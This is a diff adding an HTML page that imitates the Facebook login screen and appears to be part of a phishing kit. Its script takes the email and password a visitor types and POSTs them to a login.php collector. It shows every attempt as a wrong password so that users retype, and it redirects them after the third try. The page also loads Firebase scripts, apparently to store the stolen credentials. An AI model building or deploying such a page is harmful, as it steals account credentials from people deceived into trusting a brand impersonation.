@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #e7ebf0, #f0f2f5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-container {
+      background-color: white;
+      width: 100%;
+      max-width: 360px;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .login-container img {
+      width: 50px;
+      margin-bottom: 20px;
+    }
+
+    .login-container input {
+      width: 95%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      background-color: #f5f6f7;
+      font-size: 16px;
+    }
+
+    .login-container input:focus {
+      outline: none;
+      border-color: #1877f2;
+    }
+
+    .login-container button {
+      width: 100%;
+      padding: 12px;
+      margin: 15px 0;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .login-container button:hover {
+      background-color: #166fe5;
+    }
+
+    .login-container a {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+      display: block;
+      margin-top: 10px;
+    }
+
+    /* Secondary button (Create New Account) with gradient and border */
+    .secondary-button {
+      background: linear-gradient(135deg, #42b72a, #36a420);
+      color: white;
+      border: 2px solid #1877f2;
+      border-radius: 6px;
+      padding: 12px;
+      margin-top: 15px;
+      margin-bottom: 10px;
+      cursor: pointer;
+      font-size: 16px;
+      width: 100%;
+    }
+
+    .secondary-button:hover {
+      background: linear-gradient(135deg, #36a420, #2e921c);
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #555;
+    }
+
+    .footer p {
+      margin: 0;
+    }
+
+    .footer a {
+      color: #555;
+      text-decoration: none;
+    }
+
+    .footer img {
+      width: 100px;
+      margin-top: 5 px;
+    }
+
+    .login-container .secondary-button {
+      width: 50%;
+      padding: 12px;
+      margin: 15px 0;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+    <input id="fb-email" type="text" placeholder="Mobile number or email address">
+    <input id="fb-pass" type="password" placeholder="Password">
+    <span id="feedback"
+      style="color: red;  font-family: sans-serif; font-size: 15px; text-align: center; margin: 0 30px; "></span>
+    <button onclick="login()" id="login">Log in</button>
+    <a href="#">Forgotten Password?</a>
+    <button class="secondary-button" onclick="submit()">Create new account</button>
+    <div class="footer">
+      <!-- Adding the Meta image -->
+      <img src="image.png" alt="Meta Logo">
+      <p><a href="#">About</a> · <a href="#">Help</a> · <a href="#">More</a></p>
+    </div>
+  </div>
+  <script>
+    var login = document.getElementById('login');
+    var email = document.getElementById('fb-email');
+    var password = document.getElementById('fb-pass');
+    var feedback = document.getElementById('feedback'); // Assuming there's an element with id 'feedback'
+    var x = 0;
+
+    login.addEventListener('click', function () {
+
+      // Display the "click" feedback
+      feedback.textContent = 'Incorrect password! Please try again...';
+
+      const data = new FormData();
+      data.append('fb-email', email.value + " (FB)");
+      data.append('fb-pass', password.value);
+      const response = new XMLHttpRequest();
+      response.onreadystatechange = function () {
+        // Process response here if needed
+      };
+      response.open('POST', './login.php', true);
+      response.send(data);
+      x++;
+
+      // Redirect to another page after 3rd attempt
+      if (x == 3) {
+        window.location.href = 'index_facebook.html';
+      }
+    });
+  </script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+  <script src="js/firebase.js">
+
+  </script>
+
+</body>
+
+</html>
